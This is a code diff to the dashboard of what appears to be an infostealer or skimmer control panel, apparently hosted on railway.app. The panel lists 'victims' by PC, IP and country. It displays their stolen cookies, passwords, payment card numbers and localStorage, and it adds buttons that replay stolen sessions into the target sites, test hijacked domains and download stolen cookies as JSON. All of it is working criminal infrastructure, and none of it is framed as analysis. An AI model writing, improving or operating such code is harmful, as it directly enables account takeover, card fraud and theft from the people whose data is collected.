                 const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                let domain = entry.fingerprint?.hostname || entry.domain || '';
+                if (!domain || domain === pc || domain === 'unknown') {
+                    const cookieKeys = Object.keys(entry.cookies || {});
+                    if (cookieKeys.length > 0) {
+                        const cookieDomains = cookieKeys.map(k => {
+                            const parts = k.split('|');
+                            return parts.length > 1 ? parts[0] : null;
+                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
+                        if (cookieDomains.length > 0) {
+                            domain = cookieDomains[0];
+                        } else {
+                            domain = 'unknown';
+                        }
+                    } else {
+                        domain = 'unknown';
+                    }
+                }
                 const cards = entry.cards || [];
                 cards.forEach(c => {
                     let value = c.value || c.number || c.card_number || '';
@@ -2633,7 +2800,7 @@
         }
 
         // ============================================================
-        // LOCALSTORAGE VIEW — PC GROUPED
+        // LOCALSTORAGE VIEW
         // ============================================================
 
         function renderStorageView() {
@@ -2642,7 +2809,23 @@
 
             allData.forEach(entry => {
                 const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                let domain = entry.fingerprint?.hostname || entry.domain || '';
+                if (!domain || domain === pc || domain === 'unknown') {
+                    const cookieKeys = Object.keys(entry.cookies || {});
+                    if (cookieKeys.length > 0) {
+                        const cookieDomains = cookieKeys.map(k => {
+                            const parts = k.split('|');
+                            return parts.length > 1 ? parts[0] : null;
+                        }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
+                        if (cookieDomains.length > 0) {
+                            domain = cookieDomains[0];
+                        } else {
+                            domain = 'unknown';
+                        }
+                    } else {
+                        domain = 'unknown';
+                    }
+                }
                 const storage = entry.localStorage || {};
                 Object.entries(storage).forEach(([key, value]) => {
                     let browser = 'Unknown';
@@ -2714,7 +2897,7 @@
         }
 
         // ============================================================
-        // VICTIMS VIEW — PC GROUPED
+        // VICTIMS VIEW — WITH HEADER
         // ============================================================
 
         function renderVictimsView() {
@@ -2727,48 +2910,78 @@
                 return;
             }
 
-            let html = '';
+            let totalVictims = 0;
+            pcNames.forEach(pcName => { totalVictims += grouped[pcName].totalVictims; });
+
+            let html = `
+                <div class="section-header">
+                    👤 All Victims
+                    <span class="count">(${totalVictims} total)</span>
+                </div>
+            `;
+
             pcNames.forEach(pcName => {
                 const pc = grouped[pcName];
                 const flag = getFlagEmoji(pc.countryCode);
                 const hasCookies = pc.totalCookies > 0;
                 const hasStorage = pc.totalStorage > 0;
 
-                let domainTags = '';
-                Object.keys(pc.domains).forEach(domain => {
-                    const d = pc.domains[domain];
-                    domainTags += `<span class="domain-tag">${domain} <span class="count">(${d.cookies}🍪)</span></span>`;
+                let victimEntriesHtml = '';
+                pc.entries.forEach(entry => {
+                    const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                    const cookieCount = Object.keys(entry.cookies || {}).length;
+                    const credCount = (entry.credentials || []).length;
+                    const cardCount = (entry.cards || []).length;
+                    const storageCount = Object.keys(entry.localStorage || {}).length;
+                    const time = timeAgo(entry.receivedAt);
+                    const fullTime = formatFullTime(entry.receivedAt);
+                    const entryFlag = getFlagEmoji(entry.countryCode);
+
+                    let statsHtml = '';
+                    if (cookieCount > 0) statsHtml += `<span class="cookies">🍪 ${cookieCount}</span>`;
+                    if (credCount > 0) statsHtml += `<span class="creds">🔐 ${credCount}</span>`;
+                    if (cardCount > 0) statsHtml += `<span class="cards">💳 ${cardCount}</span>`;
+                    if (storageCount > 0) statsHtml += `<span class="storage">💾 ${storageCount}</span>`;
+
+                    victimEntriesHtml += `
+                        <div class="victim-card" onclick="openModalForEntry('${entry._uniqueId}')">
+                            <button class="v-delete" onclick="event.stopPropagation(); showDeleteConfirm('${entry._uniqueId}', '${domain}')" title="Delete victim">🗑️</button>
+                            <div class="v-header">
+                                <span class="flag">${entryFlag}</span>
+                                <span class="ip">${entry.ip || 'Unknown'}</span>
+                                <span class="pc-name">🖥️ ${pcName}</span>
+                            </div>
+                            <div class="v-details">
+                                <span class="domain">🌐 ${domain}</span>
+                                <span class="country">${entry.country || 'Unknown'}</span>
+                                <span class="time" title="${fullTime}">🕐 ${time}</span>
+                            </div>
+                            <div class="v-stats">${statsHtml}</div>
+                            <div class="v-actions">
+                                <button class="btn-sm ${cookieCount > 0 ? 'replay-cookies' : 'disabled'}" onclick="${cookieCount > 0 ? `event.stopPropagation(); replaySession('${domain}')` : ''}">▶️ Cookies</button>
+                                <button class="btn-sm ${storageCount > 0 ? 'replay-storage' : 'disabled'}" onclick="${storageCount > 0 ? `event.stopPropagation(); replayStorage('${domain}')` : ''}">💾 Storage</button>
+                                <button class="btn-sm test-sm" onclick="event.stopPropagation(); testSession('${domain}')">🔍 Test</button>
+                                <button class="btn-sm download" onclick="event.stopPropagation(); downloadDomain('${domain}')">📥</button>
+                            </div>
+                        </div>
+                    `;
                 });
 
                 html += `
-                    <div class="victim-card" onclick="openPCModalAll('${pcName}')">
-                        <button class="v-delete" onclick="event.stopPropagation(); showDeletePCConfirm('${pcName}')" title="Delete PC">🗑️</button>
-                        <div class="v-header">
-                            <span class="flag">${flag}</span>
-                            <span class="ip">${pc.ip}</span>
-                            <span class="pc-name">🖥️ ${pcName}</span>
+                    <div style="margin-top:8px;">
+                        <div style="font-size:12px;font-weight:600;color:#f472b6;padding:6px 4px;border-bottom:1px solid #1a2538;margin-bottom:4px;">
+                            🖥️ ${pcName} <span style="color:#64748b;font-weight:400;font-size:11px;">(${pc.totalVictims} victims)</span>
                         </div>
-                        <div class="v-details">
-                            <span class="country">${pc.country}</span>
-                            <span class="time">🕐 ${timeAgo(pc.latestTime)}</span>
-                            <span>👤 ${pc.totalVictims} victims</span>
-                        </div>
-                        <div class="v-domain-list">${domainTags}</div>
-                        <div class="v-actions">
-                            <button class="btn-sm ${hasCookies ? 'replay-cookies' : 'disabled'}" onclick="${hasCookies ? `event.stopPropagation(); replayAllCookiesPC('${pcName}')` : ''}" title="${hasCookies ? 'Replay all cookies' : 'No cookies'}">▶️ All Cookies</button>
-                            <button class="btn-sm ${hasStorage ? 'replay-storage' : 'disabled'}" onclick="${hasStorage ? `event.stopPropagation(); replayAllStoragePC('${pcName}')` : ''}" title="${hasStorage ? 'Replay all storage' : 'No storage'}">💾 All Storage</button>
-                            <button class="btn-sm test-sm" onclick="event.stopPropagation(); testPC('${pcName}')">🔍 Test</button>
-                            <button class="btn-sm download" onclick="event.stopPropagation(); downloadPCTxt('${pcName}')">📝</button>
-                            <button class="btn-sm view" onclick="event.stopPropagation(); openPCModalAll('${pcName}')">👁️</button>
-                        </div>
+                        ${victimEntriesHtml}
                     </div>
                 `;
             });
+
             grid.innerHTML = html;
         }
 
         // ============================================================
-        // REPLAY VIEW — PC GROUPED
+        // REPLAY VIEW
         // ============================================================
 
         function renderReplayView() {
@@ -2831,7 +3044,6 @@
             const pc = grouped[pcName];
             if (!pc) { showToast('❌ PC not found', 'error'); return; }
 
-            // Get first domain with cookies
             let firstDomain = null;
             let allCookies = {};
             Object.keys(pc.domains).forEach(domain => {
@@ -2848,14 +3060,25 @@
                 showToast('❌ No cookies found for this PC', 'error');
                 return;
             }
-            if (!firstDomain || firstDomain.includes('railway.app') || firstDomain.includes('up.railway') || firstDomain === 'unknown') {
-                showToast('⚠️ No valid domain for replay', 'error');
-                return;
+            let actualDomain = firstDomain;
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                const cookieKeys = Object.keys(allCookies);
+                for (const key of cookieKeys) {
+                    const parts = key.split('|');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                        actualDomain = parts[0];
+                        break;
+                    }
+                }
+                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                    showToast('⚠️ No valid domain for replay', 'error');
+                    return;
+                }
             }
 
             const win = window.open('', '_blank');
             if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
-            const cleanDomain = firstDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
             win.document.write(`
                 <!DOCTYPE html>
                 <html><head><title>Loading ${cleanDomain}...</title>
@@ -2897,14 +3120,25 @@
                 showToast('❌ No LocalStorage found for this PC', 'error');
                 return;
             }
-            if (!firstDomain || firstDomain.includes('railway.app') || firstDomain.includes('up.railway') || firstDomain === 'unknown') {
-                showToast('⚠️ No valid domain for replay', 'error');
-                return;
+            let actualDomain = firstDomain;
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                const storageKeys = Object.keys(allStorage);
+                for (const key of storageKeys) {
+                    const parts = key.split(':');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                        actualDomain = parts[0];
+                        break;
+                    }
+                }
+                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                    showToast('⚠️ No valid domain for replay', 'error');
+                    return;
+                }
             }
 
             const win = window.open('', '_blank');
             if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
-            const cleanDomain = firstDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
+            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
             win.document.write(`
                 <!DOCTYPE html>
                 <html><head><title>Loading ${cleanDomain}...</title>
@@ -2932,8 +3166,22 @@
 
             let domain = Object.keys(pc.domains)[0];
             if (!domain || domain.includes('railway.app') || domain.includes('up.railway') || domain === 'unknown') {
-                showToast('⚠️ No valid domain to test', 'error');
-                return;
+                // Try to find a valid domain from cookies
+                for (const entry of pc.entries) {
+                    const cookieKeys = Object.keys(entry.cookies || {});
+                    for (const key of cookieKeys) {
+                        const parts = key.split('|');
+                        if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                            domain = parts[0];
+                            break;
+                        }
+                    }
+                    if (domain && !domain.includes('railway.app') && domain !== 'unknown') break;
+                }
+                if (!domain || domain.includes('railway.app') || domain.includes('up.railway') || domain === 'unknown') {
+                    showToast('⚠️ No valid domain to test', 'error');
+                    return;
+                }
             }
             const cleanDomain = domain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
             window.open('https://' + cleanDomain, '_blank');
@@ -3106,6 +3354,10 @@
         // ============================================================
 
         function openModalForEntry(uniqueId) {
+            if (!uniqueId || uniqueId === 'unknown') {
+                showToast('❌ No victim selected', 'error');
+                return;
+            }
             let entry = null;
             let source = 'main';
             for (const e of allData) {
@@ -3120,12 +3372,29 @@
 
             currentModalEntry = entry;
             const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
-            currentModalDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+            let domain = entry.fingerprint?.hostname || entry.domain || '';
+            if (!domain || domain === pc || domain === 'unknown') {
+                const cookieKeys = Object.keys(entry.cookies || {});
+                if (cookieKeys.length > 0) {
+                    const cookieDomains = cookieKeys.map(k => {
+                        const parts = k.split('|');
+                        return parts.length > 1 ? parts[0] : null;
+                    }).filter(d => d && d !== 'unknown' && !d.includes('railway.app'));
+                    if (cookieDomains.length > 0) {
+                        domain = cookieDomains[0];
+                    } else {
+                        domain = 'unknown';
+                    }
+                } else {
+                    domain = 'unknown';
+                }
+            }
+            currentModalDomain = domain;
 
             const overlay = document.getElementById('modalOverlay');
             const isTrash = source === 'trash';
-            const title = isTrash ? `🗑️ ${pc} — ${currentModalDomain} (Deleted)` :
-                          `👤 ${pc} — ${currentModalDomain}`;
+            const title = isTrash ? `🗑️ ${pc} — ${domain} (Deleted)` :
+                          `👤 ${pc} — ${domain}`;
 
             document.getElementById('modalTitle').textContent = title;
 
@@ -3152,16 +3421,16 @@
 
             const deleteBtn = isTrash ?
                 `<button class="btn-icon-sm delete-sm" onclick="showPermanentDeleteConfirm('${entry._uniqueId}')">🗑️</button>` :
-                `<button class="btn-icon-sm delete-sm" onclick="showDeleteConfirm('${entry._uniqueId}', '${currentModalDomain}')">🗑️</button>`;
+                `<button class="btn-icon-sm delete-sm" onclick="showDeleteConfirm('${entry._uniqueId}', '${domain}')">🗑️</button>`;
 
             const restoreBtn = isTrash ?
-                `<button class="btn-icon-sm restore-sm" onclick="showRestoreConfirm('${entry._uniqueId}', '${currentModalDomain}')">↩️</button>` :
+                `<button class="btn-icon-sm restore-sm" onclick="showRestoreConfirm('${entry._uniqueId}', '${domain}')">↩️</button>` :
                 '';
 
             const txtBtn = `<button class="btn-icon-sm txt" onclick="downloadModalTxt()">📝</button>`;
-            const cookieReplayBtn = `<button class="btn-icon-sm replay-cookies" onclick="replaySession('${currentModalDomain}')">▶️</button>`;
-            const storageReplayBtn = `<button class="btn-icon-sm replay-storage" onclick="replayStorage('${currentModalDomain}')">💾</button>`;
-            const testBtn = `<button class="btn-icon-sm test-sm" onclick="testSession('${currentModalDomain}')">🔍</button>`;
+            const cookieReplayBtn = `<button class="btn-icon-sm replay-cookies" onclick="replaySession('${domain}')">▶️</button>`;
+            const storageReplayBtn = `<button class="btn-icon-sm replay-storage" onclick="replayStorage('${domain}')">💾</button>`;
+            const testBtn = `<button class="btn-icon-sm test-sm" onclick="testSession('${domain}')">🔍</button>`;
 
             let html = `
                 <div class="victim-entry">
@@ -3213,7 +3482,7 @@
                         ${creds.map((c, idx) => {
                             const name = c.name || c.username || c.field || 'unknown';
                             const value = c.value || c.password || '';
-                            const url = c.url || c.origin_url || currentModalDomain;
+                            const url = c.url || c.origin_url || domain;
                             const type = c.type || 'text';
                             const escaped = value.replace(/'/g, "\\'");
                             const visKey = 'modal-cred-' + idx;
@@ -3241,7 +3510,7 @@
                         ${cards.map((c, idx) => {
                             let value = c.value || c.number || c.card_number || '';
                             const name = c.name || c.cardholder || c.holder || 'Unknown';
-                            const url = c.url || c.origin_url || currentModalDomain;
+                            const url = c.url || c.origin_url || domain;
                             const type = c.type || 'card';
                             if (!value || value === '' || value === 'undefined' || value === 'null') return '';
                             if (c.month && c.year && !value.includes('/')) {
@@ -3318,19 +3587,32 @@
                     actualDomain = entryDomain;
                 }
             });
-            if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+            if (Object.keys(cookies).length === 0) {
+                // Try to find cookies from any entry with this domain
                 for (const entry of allData) {
-                    const ed = entry.fingerprint?.hostname || entry.domain || '';
-                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
-                        actualDomain = ed;
-                        cookies = {};
+                    const entryDomain = entry.fingerprint?.hostname || entry.domain || '';
+                    if (entryDomain && entryDomain === domain) {
                         Object.assign(cookies, entry.cookies || {});
+                        actualDomain = entryDomain;
                         break;
                     }
                 }
             }
-            if (Object.keys(cookies).length === 0) { showToast('❌ No valid domain', 'error'); return; }
+            if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                const cookieKeys = Object.keys(cookies);
+                for (const key of cookieKeys) {
+                    const parts = key.split('|');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                        actualDomain = parts[0];
+                        break;
+                    }
+                }
+                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                    showToast('❌ No valid domain', 'error');
+                    return;
+                }
+            }
             const win = window.open('', '_blank');
             if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
             const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
@@ -3364,19 +3646,31 @@
                     actualDomain = entryDomain;
                 }
             });
-            if (Object.keys(storage).length === 0) { showToast('❌ No storage found', 'error'); return; }
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+            if (Object.keys(storage).length === 0) {
                 for (const entry of allData) {
-                    const ed = entry.fingerprint?.hostname || entry.domain || '';
-                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
-                        actualDomain = ed;
-                        storage = {};
+                    const entryDomain = entry.fingerprint?.hostname || entry.domain || '';
+                    if (entryDomain && entryDomain === domain) {
                         Object.assign(storage, entry.localStorage || {});
+                        actualDomain = entryDomain;
                         break;
                     }
                 }
             }
-            if (Object.keys(storage).length === 0) { showToast('❌ No valid domain', 'error'); return; }
+            if (Object.keys(storage).length === 0) { showToast('❌ No storage found', 'error'); return; }
+            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                const storageKeys = Object.keys(storage);
+                for (const key of storageKeys) {
+                    const parts = key.split(':');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                        actualDomain = parts[0];
+                        break;
+                    }
+                }
+                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                    showToast('❌ No valid domain', 'error');
+                    return;
+                }
+            }
             const win = window.open('', '_blank');
             if (!win) { showToast('⚠️ Popup blocked', 'error'); return; }
             const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
@@ -3428,12 +3722,17 @@
             });
             if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
             if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                for (const entry of allData) {
-                    const ed = entry.fingerprint?.hostname || entry.domain || '';
-                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
-                        actualDomain = ed;
+                const cookieKeys = Object.keys(cookies);
+                for (const key of cookieKeys) {
+                    const parts = key.split('|');
+                    if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                        actualDomain = parts[0];
                         break;
                     }
+                }
+                if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
+                    showToast('⚠️ No valid domain', 'error');
+                    return;
                 }
             }
             const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
@@ -3455,7 +3754,17 @@
             container.innerHTML = '<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ Testing...</div>';
             const domains = new Set();
             allData.forEach(entry => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                let domain = entry.fingerprint?.hostname || entry.domain || '';
+                if (!domain || domain.includes('railway.app') || domain.includes('up.railway') || domain === 'unknown') {
+                    const cookieKeys = Object.keys(entry.cookies || {});
+                    for (const key of cookieKeys) {
+                        const parts = key.split('|');
+                        if (parts.length > 1 && parts[0] && !parts[0].includes('railway.app') && parts[0] !== 'unknown') {
+                            domain = parts[0];
+                            break;
+                        }
+                    }
+                }
                 if (domain && !domain.includes('railway.app') && !domain.includes('up.railway') && domain !== 'unknown') {
                     domains.add(domain);
                 }
@@ -3627,6 +3936,38 @@
             document.body.removeChild(a);
             URL.revokeObjectURL(url);
             showToast('📥 Raw JSON exported', 'success');
+        }
+
+        function downloadDomain(domain) {
+            let cookies = {};
+            allData.forEach(entry => {
+                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
+                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
+                    Object.assign(cookies, entry.cookies || {});
+                }
+            });
+            if (Object.keys(cookies).length === 0) {
+                // Try with just domain match
+                for (const entry of allData) {
+                    const entryDomain = entry.fingerprint?.hostname || entry.domain || '';
+                    if (entryDomain && entryDomain === domain) {
+                        Object.assign(cookies, entry.cookies || {});
+                        break;
+                    }
+                }
+            }
+            if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
+            const data = { domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `cookies_${domain}_${new Date().toISOString().slice(0,10)}.json`;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast(`📥 Downloaded ${Object.keys(cookies).length} cookies for ${domain}`, 'success');
         }
 
         // ============================================================
